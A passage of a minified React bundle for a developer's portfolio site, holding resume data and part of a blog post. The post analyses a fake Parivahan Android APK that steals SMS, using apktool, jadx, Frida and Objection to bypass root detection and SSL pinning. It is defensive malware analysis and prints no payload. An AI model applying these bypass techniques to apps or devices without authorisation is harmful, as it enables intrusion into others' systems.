Error(l(314))}r!==null&&r.delete(t),oc(e,n)}var lc;lc=function(e,t,n){if(e!==null)if(e.memoizedProps!==t.pendingProps||Be.current)We=!0;else{if((e.lanes&n)===0&&(t.flags&128)===0)return We=!1,Pp(e,t,n);We=(e.flags&131072)!==0}else We=!1,pe&&(t.flags&1048576)!==0&&Fa(t,vi,t.index);switch(t.lanes=0,t.tag){case 2:var r=t.type;Li(e,t),e=t.pendingProps;var i=Dn(t,Re.current);Un(t,n),i=mo(null,t,r,e,i,n);var s=go();return t.flags|=1,typeof i=="object"&&i!==null&&typeof i.render=="function"&&i.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,Ue(r)?(s=!0,mi(t)):s=!1,t.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,lo(t),i.updater=Ii,t.stateNode=i,i._reactInternals=t,So(t,r,e,n),t=Po(null,t,r,!0,s,n)):(t.tag=0,pe&&s&&Xs(t),De(null,t,i,n),t=t.child),t;case 16:r=t.elementType;e:{switch(Li(e,t),e=t.pendingProps,i=r._init,r=i(r._payload),t.type=r,i=t.tag=Bp(r),e=ft(r,e),i){case 0:t=To(null,t,r,e,n);break e;case 1:t=Lu(null,t,r,e,n);break e;case 11:t=bu(null,t,r,e,n);break e;case 14:t=Au(null,t,r,ft(r.type,e),n);break e}throw Error(l(306,r,""))}return t;case 0:return r=t.type,i=t.pendingProps,i=t.elementType===r?i:ft(r,i),To(e,t,r,i,n);case 1:return r=t.type,i=t.pendingProps,i=t.elementType===r?i:ft(r,i),Lu(e,t,r,i,n);case 3:e:{if(Nu(t),e===null)throw Error(l(387));r=t.pendingProps,s=t.memoizedState,i=s.element,Ga(e,t),Ei(t,r,null,n);var u=t.memoizedState;if(r=u.element,s.isDehydrated)if(s={element:r,isDehydrated:!1,cache:u.cache,pendingSuspenseBoundaries:u.pendingSuspenseBoundaries,transitions:u.transitions},t.updateQueue.baseState=s,t.memoizedState=s,t.flags&256){i=Hn(Error(l(423)),t),t=zu(e,t,r,n,i);break e}else if(r!==i){i=Hn(Error(l(424)),t),t=zu(e,t,r,n,i);break e}else for(Je=qt(t.stateNode.containerInfo.firstChild),Ze=t,pe=!0,pt=null,n=Qa(t,null,r,n),t.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if($n(),r===i){t=zt(e,t,n);break e}De(e,t,r,n)}t=t.child}return t;case 5:return Za(t),e===null&&eo(t),r=t.type,i=t.pendingProps,s=e!==null?e.memoizedProps:null,u=i.children,qs(r,i)?u=null:s!==null&&qs(r,s)&&(t.flags|=32),ju(e,t),De(e,t,u,n),t.child;case 6:return e===null&&eo(t),null;case 13:return Du(e,t,n);case 4:return ao(t,t.stateNode.containerInfo),r=t.pendingProps,e===null?t.child=Fn(t,null,r,n):De(e,t,r,n),t.child;case 11:return r=t.type,i=t.pendingProps,i=t.elementType===r?i:ft(r,i),bu(e,t,r,i,n);case 7:return De(e,t,t.pendingProps,n),t.child;case 8:return De(e,t,t.pendingProps.children,n),t.child;case 12:return De(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,i=t.pendingProps,s=t.memoizedProps,u=i.value,ae(xi,r._currentValue),r._currentValue=u,s!==null)if(dt(s.value,u)){if(s.children===i.children&&!Be.current){t=zt(e,t,n);break e}}else for(s=t.child,s!==null&&(s.return=t);s!==null;){var p=s.dependencies;if(p!==null){u=s.child;for(var f=p.firstContext;f!==null;){if(f.context===r){if(s.tag===1){f=Nt(-1,n&-n),f.tag=2;var _=s.updateQueue;if(_!==null){_=_.shared;var A=_.pending;A===null?f.next=f:(f.next=A.next,A.next=f),_.pending=f}}s.lanes|=n,f=s.alternate,f!==null&&(f.lanes|=n),so(s.return,n,t),p.lanes|=n;break}f=f.next}}else if(s.tag===10)u=s.type===t.type?null:s.child;else if(s.tag===18){if(u=s.return,u===null)throw Error(l(341));u.lanes|=n,p=u.alternate,p!==null&&(p.lanes|=n),so(u,n,t),u=s.sibling}else u=s.child;if(u!==null)u.return=s;else for(u=s;u!==null;){if(u===t){u=null;break}if(s=u.sibling,s!==null){s.return=u.return,u=s;break}u=u.return}s=u}De(e,t,i.children,n),t=t.child}return t;case 9:return i=t.type,r=t.pendingProps.children,Un(t,n),i=it(i),r=r(i),t.flags|=1,De(e,t,r,n),t.child;case 14:return r=t.type,i=ft(r,t.pendingProps),i=ft(r.type,i),Au(e,t,r,i,n);case 15:return Ru(e,t,t.type,t.pendingProps,n);case 17:return r=t.type,i=t.pendingProps,i=t.elementType===r?i:ft(r,i),Li(e,t),t.tag=1,Ue(r)?(e=!0,mi(t)):e=!1,Un(t,n),xu(t,r,i),So(t,r,i,n),Po(null,t,r,!0,e,n);case 19:return Ou(e,t,n);case 22:return Iu(e,t,n)}throw Error(l(156,t.tag))};function ac(e,t){return Bl(e,t)}function Fp(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function lt(e,t,n,r){return new Fp(e,t,n,r)}function Vo(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Bp(e){if(typeof e=="function")return Vo(e)?1:0;if(e!=null){if(e=e.$$typeof,e===kt)return 11;if(e===wt)return 14}return 2}function nn(e,t){var n=e.alternate;return n===null?(n=lt(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&14680064,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Hi(e,t,n,r,i,s){var u=2;if(r=e,typeof e=="function")Vo(e)&&(u=1);else if(typeof e=="string")u=5;else e:switch(e){case $e:return kn(n.children,i,s,t);case tt:u=8,i|=8;break;case Ot:return e=lt(12,n,t,i|2),e.elementType=Ot,e.lanes=s,e;case Ge:return e=lt(13,n,t,i),e.elementType=Ge,e.lanes=s,e;case ut:return e=lt(19,n,t,i),e.elementType=ut,e.lanes=s,e;case ge:return qi(n,i,s,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case bt:u=10;break e;case on:u=9;break e;case kt:u=11;break e;case wt:u=14;break e;case Fe:u=16,r=null;break e}throw Error(l(130,e==null?e:typeof e,""))}return t=lt(u,n,t,i),t.elementType=e,t.type=r,t.lanes=s,t}function kn(e,t,n,r){return e=lt(7,e,r,t),e.lanes=n,e}function qi(e,t,n,r){return e=lt(22,e,r,t),e.elementType=ge,e.lanes=n,e.stateNode={isHidden:!1},e}function Qo(e,t,n){return e=lt(6,e,null,t),e.lanes=n,e}function Ko(e,t,n){return t=lt(4,e.children!==null?e.children:[],e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Up(e,t,n,r,i){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=ws(0),this.expirationTimes=ws(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=ws(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function Go(e,t,n,r,i,s,u,p,f){return e=new Up(e,t,n,p,f),t===1?(t=1,s===!0&&(t|=8)):t=0,s=lt(3,null,null,t),e.current=s,s.stateNode=e,s.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},lo(s),e}function Wp(e,t,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:ve,key:r==null?null:""+r,children:e,containerInfo:t,implementation:n}}function uc(e){if(!e)return Qt;e=e._reactInternals;e:{if(ln(e)!==e||e.tag!==1)throw Error(l(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(Ue(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(l(171))}if(e.tag===1){var n=e.type;if(Ue(n))return Ma(e,n,t)}return t}function cc(e,t,n,r,i,s,u,p,f){return e=Go(n,r,!0,e,i,s,u,p,f),e.context=uc(null),n=e.current,r=Me(),i=en(n),s=Nt(r,i),s.callback=t??null,Yt(n,s,i),e.current.lanes=i,ir(e,i,r),qe(e,r),e}function Vi(e,t,n,r){var i=t.current,s=Me(),u=en(i);return n=uc(n),t.context===null?t.context=n:t.pendingContext=n,t=Nt(s,u),t.payload={element:e},r=r===void 0?null:r,r!==null&&(t.callback=r),e=Yt(i,t,u),e!==null&&(gt(e,i,u,s),_i(e,i,u)),u}function Qi(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function dc(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function Yo(e,t){dc(e,t),(e=e.alternate)&&dc(e,t)}function Hp(){return null}var pc=typeof reportError=="function"?reportError:function(e){console.error(e)};function Xo(e){this._internalRoot=e}Ki.prototype.render=Xo.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(l(409));Vi(e,t,null,null)},Ki.prototype.unmount=Xo.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;gn(function(){Vi(null,e,null,null)}),t[At]=null}};function Ki(e){this._internalRoot=e}Ki.prototype.unstable_scheduleHydration=function(e){if(e){var t=Gl();e={blockedOn:null,target:e,priority:t};for(var n=0;n<Ut.length&&t!==0&&t<Ut[n].priority;n++);Ut.splice(n,0,e),n===0&&Zl(e)}};function Zo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Gi(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function fc(){}function qp(e,t,n,r,i){if(i){if(typeof r=="function"){var s=r;r=function(){var _=Qi(u);s.call(_)}}var u=cc(t,r,e,0,null,!1,!1,"",fc);return e._reactRootContainer=u,e[At]=u.current,vr(e.nodeType===8?e.parentNode:e),gn(),u}for(;i=e.lastChild;)e.removeChild(i);if(typeof r=="function"){var p=r;r=function(){var _=Qi(f);p.call(_)}}var f=Go(e,0,!1,null,null,!1,!1,"",fc);return e._reactRootContainer=f,e[At]=f.current,vr(e.nodeType===8?e.parentNode:e),gn(function(){Vi(t,f,n,r)}),f}function Yi(e,t,n,r,i){var s=n._reactRootContainer;if(s){var u=s;if(typeof i=="function"){var p=i;i=function(){var f=Qi(u);p.call(f)}}Vi(t,u,e,i)}else u=qp(n,t,e,i,r);return Qi(u)}Ql=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=rr(t.pendingLanes);n!==0&&(xs(t,n|1),qe(t,ke()),(Z&6)===0&&(Qn=ke()+500,Kt()))}break;case 13:gn(function(){var r=Lt(e,1);if(r!==null){var i=Me();gt(r,e,1,i)}}),Yo(e,1)}},Ss=function(e){if(e.tag===13){var t=Lt(e,134217728);if(t!==null){var n=Me();gt(t,e,134217728,n)}Yo(e,134217728)}},Kl=function(e){if(e.tag===13){var t=en(e),n=Lt(e,t);if(n!==null){var r=Me();gt(n,e,t,r)}Yo(e,t)}},Gl=function(){return re},Yl=function(e,t){var n=re;try{return re=e,t()}finally{re=n}},hs=function(e,t,n){switch(t){case"input":if(os(e,n),t=n.name,n.type==="radio"&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var i=fi(r);if(!i)throw Error(l(90));wl(r),os(r,i)}}}break;case"textarea":Tl(e,n);break;case"select":t=n.value,t!=null&&En(e,!!n.multiple,t,!1)}},Nl=Wo,zl=gn;var Vp={usingClientEntryPoint:!1,Events:[xr,Nn,fi,jl,Ll,Wo]},zr={findFiberByHostInstance:an,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Qp={bundleType:zr.bundleType,version:zr.version,rendererPackageName:zr.rendererPackageName,rendererConfig:zr.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Ee.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=$l(e),e===null?null:e.stateNode},findFiberByHostInstance:zr.findFiberByHostInstance||Hp,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Xi=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Xi.isDisabled&&Xi.supportsFiber)try{Kr=Xi.inject(Qp),xt=Xi}catch{}}return Ve.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Vp,Ve.createPortal=function(e,t){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Zo(t))throw Error(l(200));return Wp(e,t,null,n)},Ve.createRoot=function(e,t){if(!Zo(e))throw Error(l(299));var n=!1,r="",i=pc;return t!=null&&(t.unstable_strictMode===!0&&(n=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onRecoverableError!==void 0&&(i=t.onRecoverableError)),t=Go(e,1,!1,null,null,n,!1,r,i),e[At]=t.current,vr(e.nodeType===8?e.parentNode:e),new Xo(t)},Ve.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(l(188)):(e=Object.keys(e).join(","),Error(l(268,e)));return e=$l(t),e=e===null?null:e.stateNode,e},Ve.flushSync=function(e){return gn(e)},Ve.hydrate=function(e,t,n){if(!Gi(t))throw Error(l(200));return Yi(null,e,t,!0,n)},Ve.hydrateRoot=function(e,t,n){if(!Zo(e))throw Error(l(405));var r=n!=null&&n.hydratedSources||null,i=!1,s="",u=pc;if(n!=null&&(n.unstable_strictMode===!0&&(i=!0),n.identifierPrefix!==void 0&&(s=n.identifierPrefix),n.onRecoverableError!==void 0&&(u=n.onRecoverableError)),t=cc(t,null,e,1,n??null,i,!1,s,u),e[At]=t.current,vr(e),r)for(e=0;e<r.length;e++)n=r[e],i=n._getVersion,i=i(n._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[n,i]:t.mutableSourceEagerHydrationData.push(n,i);return new Ki(t)},Ve.render=function(e,t,n){if(!Gi(t))throw Error(l(200));return Yi(null,e,t,!1,n)},Ve.unmountComponentAtNode=function(e){if(!Gi(e))throw Error(l(40));return e._reactRootContainer?(gn(function(){Yi(null,null,e,!1,function(){e._reactRootContainer=null,e[At]=null})}),!0):!1},Ve.unstable_batchedUpdates=Wo,Ve.unstable_renderSubtreeIntoContainer=function(e,t,n,r){if(!Gi(n))throw Error(l(200));if(e==null||e._reactInternals===void 0)throw Error(l(38));return Yi(e,t,n,!1,r)},Ve.version="18.3.1-next-f1338f8080-20240426",Ve}var xc;function rf(){if(xc)return tl.exports;xc=1;function a(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(a)}catch(o){console.error(o)}}return a(),tl.exports=nf(),tl.exports}var Sc;function sf(){if(Sc)return Zi;Sc=1;var a=rf();return Zi.createRoot=a.createRoot,Zi.hydrateRoot=a.hydrateRoot,Zi}var _c=sf();const Dc=me.createContext({path:"/",navigate:()=>{}});function cl(){return me.useContext(Dc)}function of({location:a,children:o}){const[l,d]=me.useState(()=>a??(typeof window>"u"?"/":window.location.pathname));me.useEffect(()=>{const h=()=>d(window.location.pathname);return window.addEventListener("popstate",h),()=>window.removeEventListener("popstate",h)},[]);const c=me.useCallback(h=>{typeof window>"u"||h!==window.location.pathname+window.location.search&&(window.history.pushState(null,"",h),d(h.split(/[?#]/)[0]),window.scrollTo(0,0))},[]);return y.jsx(Dc.Provider,{value:{path:l,navigate:c},children:o})}function at({to:a,children:o,className:l,onClick:d,"aria-current":c}){const{navigate:h}=cl(),w=S=>{S.defaultPrevented||S.button!==0||S.metaKey||S.ctrlKey||S.shiftKey||S.altKey||(S.preventDefault(),d==null||d(),h(a))};return y.jsx("a",{href:a,className:l,onClick:w,"aria-current":c,children:o})}const se={name:"Aaron Thomas",title:"Backend Engineer | Full-Stack Developer",location:"Thrissur, Kerala",email:"aaron123thomas098@gmail.com",links:{github:"https://github.com/arxhr007",linkedin:"https://www.linkedin.com/in/aaron-thomas-parakkal",website:"https://arxhr007.tech",resume:"/Aaron_Thomas.pdf"}},lf="Final year Computer Science student building **production backends** — **REST APIs** in **Python/FastAPI** and **Node.js**, **PostgreSQL** and **Firebase** data models, and **AWS deployments** — from **government CMS and LMS platforms** to **Android app backends**.",af=[{group:"Languages",items:["Python","Go","Rust","TypeScript/JavaScript","Java","C"]},{group:"Backend",items:["Node.js","FastAPI","REST APIs","PostgreSQL","MongoDB","Firebase","Supabase"]},{group:"Frontend",items:["React","Next.js","React Native","Tailwind CSS"]},{group:"Cloud/DevOps",items:["AWS","GCP","Docker","CI/CD"]},{group:"AI/ML",items:["LangChain","LangGraph","LlamaIndex","Prompt Engineering"]},{group:"Soft Skills",items:["Communication","Teamwork","Leadership","Problem Solving"]}],uf=[{role:"Backend Developer (Contract)",company:"Lions Information Technology L.L.C",url:"https://www.lionsinfosys.com/",meta:"04/2026 - 08/2026 | Dubai, UAE (Remote)",points:["Built **backend services** and **REST APIs** powering **Android applications** using **Python** and **FastAPI**.","Designed **PostgreSQL data models** and deployed services on **AWS** for mobile clients."]},{role:"Software Engineering Intern",company:"Stride, K-DISC",meta:"10/2025 - 10/2026 | Thiruvananthapuram, KL",points:["Developed enterprise **CMS** and **LMS platforms** for the **Government of Kerala** using **Next.js**, **Node.js**, and **AWS**."]},{role:"Backend & Automation Engineer (Part-time)",company:"Sahrdaya College of Engineering & Technology (Autonomous)",meta:"08/2025 - 02/2026 | Kodakara, KL",points:["Architected backend systems for the **official college website** and **CMS** using **Firebase**, **Node.js**, and **REST APIs**.","Built **workflow automation** and **system orchestration** to streamline CMS operations and reduce repetitive manual work."]},{role:"Web Development Intern",company:"Pexcel Solutions",meta:"12/2024 - 06/2025 | New Zealand (Remote)",points:["Developed **responsive frontend interfaces** using **React.js** and **Tailwind CSS** for international client projects."]}],cf=[{name:"Aliens Eye",url:"https://github.com/arxhr007/Aliens_eye",tagline:"AI-Powered Cross-Platform Profile Analysis",points:["Built an **async platform** analyzing public profiles across **840+ sites** with **ML/heuristic scoring** and cross-site profile correlation.","Achieved **4700+ GitHub stars**."],tags:["Python","Bash"]},{name:"AYRA",url:"https://blog.myosa-sensors.org/blog.html?file=blogs%2Fayra.md",tagline:"TinyML-Based Autonomic Dysreflexia Early Warning System",points:["Built a **below-knee early-warning wearable** for autonomic dysreflexia, combining **GSR**, **PPG/HRV**, **ECG**, skin temperature, humidity, and motion with an **int8-quantized TinyML model** on **ESP32**.","Presented AYRA at the **IEEE BioSensors 2026** conference in Bangkok, Thailand."],tags:["TinyML","ESP32","TensorFlow Lite"]},{name:"NeuroLearn",url:"https://github.com/arxhr007/neurolearn",tagline:"Adaptive AI Tutor",points:["Built an **adaptive tutor for neurodivergent learners** using **LangGraph**, personalized learning flows, and **RAG**.","Presented at an **OpenAI Community Meetup**."],tags:["LangGraph","RAG","FastAPI"]},{name:"Amma",url:"https://github.com/arxhr007/amma",tagline:"Malayalam Programming Language",points:["Designed a **Rust interpreter** — lexer, parser, and evaluator — with transliteration for **Malayalam script** or romanized English."],tags:["Rust"]}],df=["**ggml-org/llama.cpp** (Python): Rejected malformed **gguf-py** tokenizer merge pairs to prevent corrupted models.","**apache/kafka** (Java) & **apache/airflow** (Python): Rejected negative wire-decoded field sizes reaching new byte[size]; fixed a secrets masker leaking a prefixed secret's tail into logs.","**docker/docker-agent** (Go): Fixed safety rules that let sort -o and tree -o overwrite files without a prompt; added regression tests.","**redis/redis-py** (Python): Fixed CLIENT LIST parsing splitting records on VT, FF, NEL and U+2028; unified both parse paths.","**projectdiscovery** nuclei, httpx & subfinder (Go): Fixed template validation, charset decoding, and -max-results limits.","**awslabs/llrt** & **VirusTotal/yara-x** (Rust): Aligned Buffer encodings and concat with Node.js; let --ignore-module skip partially implemented modules.","**radareorg/radare2** & **fastfetch** (C): Added a histogram ruler, fixed Cs arguments, and three format-parser bugs.","Also contributed: **python-pillow/Pillow**, **bettercap/bettercap**, **TabularisDB/tabularis**, **mvt-project/mvt**, **awslabs/amazon-documentdb-tools**."],pf=["**Coders Club Lead**, IEDC Sahrdaya: Organized developer workshops, project sessions, and innovation activities.","**Technical Team**, IEEE Sahrdaya: Built event websites, attendance systems, and event management applications."],il={degree:"B.Tech in Computer Science and Engineering",lines:["Sahrdaya College of Engineering & Technology (Autonomous)","APJ Abdul Kalam Technological University (KTU)"],meta:"2023 - 2027 | Kodakara, KL"},ff=["**AYRA** — **MYOSA International Hackathon Finalist**; presented at **IEEE BioSensors 2026**, Bangkok, Thailand.","**4x CTF Winner** — Won four **Capture The Flag** cybersecurity competitions."];function hf(){if(typeof document<"u"){const a=document.documentElement.dataset.theme;if(a==="light"||a==="dark")return a}return"light"}function mf(){const[a,o]=me.useState(hf);return me.useEffect(()=>{document.documentElement.dataset.theme=a;try{localStorage.setItem("theme",a)}catch{}},[a]),{theme:a,toggle:()=>o(d=>d==="dark"?"light":"dark")}}function gf(){const{theme:a,toggle:o}=mf(),[l,d]=me.useState(!1);return me.useEffect(()=>d(!0),[]),y.jsx("button",{className:"theme-toggle",type:"button",onClick:o,"aria-label":l?`Switch to ${a==="dark"?"light":"dark"} mode`:"Toggle theme",title:"Toggle theme",children:l&&a==="dark"?y.jsxs("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none","aria-hidden":"true",children:[y.jsx("circle",{cx:"12",cy:"12",r:"4",fill:"currentColor"}),y.jsx("path",{d:"M12 2v3M12 19v3M2 12h3M19 12h3M4.9 4.9l2.1 2.1M17 17l2.1 2.1M19.1 4.9L17 7M7 17l-2.1 2.1",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round"})]}):y.jsx("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none","aria-hidden":"true",children:y.jsx("path",{d:"M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z",fill:"currentColor"})})})}function yf(){const[a,o]=me.useState(!1),{path:l}=cl(),d=()=>o(!1),c=l.startsWith("/blog");return y.jsxs("nav",{className:"top-nav",children:[y.jsxs("div",{className:"nav-left",children:[y.jsx(at,{className:"brand",to:"/",onClick:d,children:se.name}),y.jsx(gf,{})]}),y.jsxs("button",{className:`hamburger${a?" active":""}`,"aria-label":"Toggle menu","aria-expanded":a,onClick:()=>o(h=>!h),children:[y.jsx("span",{}),y.jsx("span",{}),y.jsx("span",{})]}),y.jsxs("div",{className:`nav-actions${a?" active":""}`,children:[y.jsx(at,{className:"nav-btn",to:"/blog",onClick:d,"aria-current":c?"page":void 0,children:"Blog"}),y.jsx("a",{className:"nav-btn",href:se.links.resume,target:"_blank",rel:"noreferrer",children:"Download Resume"})]})]})}function vf({children:a}){return y.jsxs(y.Fragment,{children:[y.jsx(yf,{}),a,y.jsxs("footer",{className:"footer",children:[y.jsxs("p",{children:[se.name," — ",y.jsx("span",{children:"2026"})]}),y.jsxs("p",{children:[y.jsx("a",{href:se.links.github,target:"_blank",rel:"noreferrer",children:"GitHub"})," ","•"," ",y.jsx(at,{to:"/blog",children:"Blog"})," •"," ",y.jsx("a",{href:`mailto:${se.email}`,children:"Email"})]})]})]})}function Mc({children:a}){const o=a.split(/(\*\*[^*]+\*\*)/g);return y.jsx(y.Fragment,{children:o.map((l,d)=>{const c=l.match(/^\*\*([^*]+)\*\*$/);return c?y.jsx("span",{className:"hl",children:c[1]},d):y.jsx(me.Fragment,{children:l},d)})})}function Ec({items:a}){return y.jsx("div",{className:"tag-list",children:a.map(o=>y.jsx("span",{className:"tag",children:o},o))})}function Mr({items:a}){return y.jsx("ul",{className:"list",children:a.map((o,l)=>y.jsx("li",{children:y.jsx(Mc,{children:o})},l))})}function Oc(a=[]){me.useEffect(()=>{const o=Array.from(document.querySelectorAll(".reveal:not(.is-visible)"));if(!o.length)return;if(!("IntersectionObserver"in window)){o.forEach(d=>d.classList.add("is-visible"));return}const l=new IntersectionObserver(d=>{d.forEach(c=>{c.isIntersecting&&(c.target.classList.add("is-visible"),l.unobserve(c.target))})},{rootMargin:"0px 0px -8% 0px"});return o.forEach(d=>l.observe(d)),()=>l.disconnect()},a)}const kf=`# Android Malware Analysis: Uncovering a Sophisticated Android Malware

## Introduction

What began as investigating a suspicious APK received via WhatsApp turned into discovering a sophisticated malware operation designed to steal SMS messages from victims. The attack started with a message from a fake number impersonating Parivahan (India's transport department), claiming I had violated road rules and needed to pay a fine through their app. Having previously written a blog about punishing scammer APKs, one of my friends forwarded this suspicious app to me for analysis. While the application closely resembled the official Parivahan interface, careful analysis revealed it was actually malware. This post walks through my analysis process, techniques used, and findings.

![whatsapp](https://i.ibb.co/Pzwky5P9/w.jpg)

> **Note:** This malware was capable of much more damage than just SMS harvesting, but I've focused on the primary functionality to avoid unnecessary complexity in this analysis.

## Initial Contact and Social Engineering

The attackers used a classic social engineering approach:
- Sent a WhatsApp message from an unknown number
- Claimed to represent the Parivahan department
- Alleged I had violated traffic rules
- Created urgency by demanding immediate payment of a fine
- Provided an apk to install their "official" app for processing the payment

The message contained just enough official-sounding language and urgency to potentially trick users into downloading the malicious application without verifying its authenticity.

## Initial Static Analysis

### APK Unpacking
The first step was unpacking the suspicious APK using apktool:

\`\`\`bash
apktool d pari.apk -o pari
\`\`\`

The files appeared heavily obfuscated, suggesting this wasn't the work of an amateur.

![unziped](https://i.ibb.co/wZ3Q69fX/unziped.png)

A particularly interesting discovery was an additional APK file named "childapp.apk" in the assets directory, indicating a potential multi-stage infection.

![kidapp](https://i.ibb.co/wZxPNHp5/childapp.png)

Upon further investigation of the child app:

![kidunziped](https://i.ibb.co/3yM0Qkhn/chilunziped.png)

### About Obfuscation
Obfuscation is a technique used by developers to make code difficult to understand, reverse engineer, or analyze. In legitimate apps, it protects intellectual property, but malware authors use it to evade detection and analysis. Common obfuscation techniques include:
- Renaming variables to meaningless names
- Encrypting strings and values
- Breaking logical flow of code
- Adding dummy code

The heavy obfuscation in this malware made static analysis challenging and indicated professional development.

### Decompilation Attempts
To analyze the code more effectively, I created a multithreaded bash script to decompile all DEX files using jadx:

\`\`\`bash
#!/bin/bash
find . -name "*.dex" | xargs -P 8 -I{} jadx -d decompiled_{} {}
\`\`\`

Despite decompilation, the code remained heavily obfuscated. I ran YARA rules looking for suspicious API calls, but found nothing conclusive due to the extensive obfuscation. At this point, static analysis had reached its limits.

## Dynamic Analysis

### Emulator Setup
I set up an Android emulator using a clean image and installed the suspicious APK. Initially, the app wouldn't launch due to sophisticated root detection mechanisms.

The app's icon and interface were meticulously crafted to mimic the official Parivahan app:

![pari](https://i.ibb.co/DPyyqW9s/icon.png)

### Frida Instrumentation
I used Frida to extract runtime information about the APK:

![frida](https://i.ibb.co/1tvcJH4s/uai.png)

The file "sjy.mutk.fvdghu.qama" was identified as the malware package name—deliberately nonsensical to avoid detection.

### Bypassing Root Detection
I used Objection to bypass the root detection mechanisms:

![root](https://i.ibb.co/nMJ1nrYz/root.png)

After bypassing root detection, I was able to launch the application.



### Cryptographic Function Analysis
Using a Frida script for inspecting AES operations, I monitored the app's encryption activities:

![enc](https://i.ibb.co/m5MnTPkG/frida-enc.png)

### Anti-Uninstallation Measures
When I attempted to uninstall the app, it actively interfered with the process:

![giv](https://i.ibb.co/FkN367Rh/uninstall.gif)

### Permission Requests
Upon installation, the app requested multiple sensitive permissions:
- SMS access
- Call logs access
- Storage access

### Secondary Payload Delivery
The app immediately displayed an "update required" prompt, confirming it was using a stager approach:

![update](https://i.ibb.co/jvgPXBcT/update.png)

### Understanding Stagers
A "stager" is an initial, lightweight malware component that establishes a foothold on the victim's device and then downloads or unpacks more powerful malware. This technique:
- Reduces initial detection risk (smaller, less suspicious first payload)
- Provides flexibility (can deliver different payloads to different victims)
- Creates persistence (even if the main malware is detected, the stager might remain)

In this case, the initial APK acted as a stager by containing and later activating "childapp.apk", the main payload.

After clicking "Update," it requested additional permissions:

![permission](https://i.ibb.co/S7HF59P4/c.png)

Most concerningly, it requested accessibility permissions:

![asses](https://i.ibb.co/ZzXwYm2n/b.png)

### Traffic Analysis
To intercept network traffic, I set up monitoring with Frida and Burp Suite. Surprisingly, the app made no immediate network requests. I suspected SSL certificate pinning and used Objection to disable it:

![ssl](https://i.ibb.co/7d54z998/ssl.png)

### What is SSL Pinning?
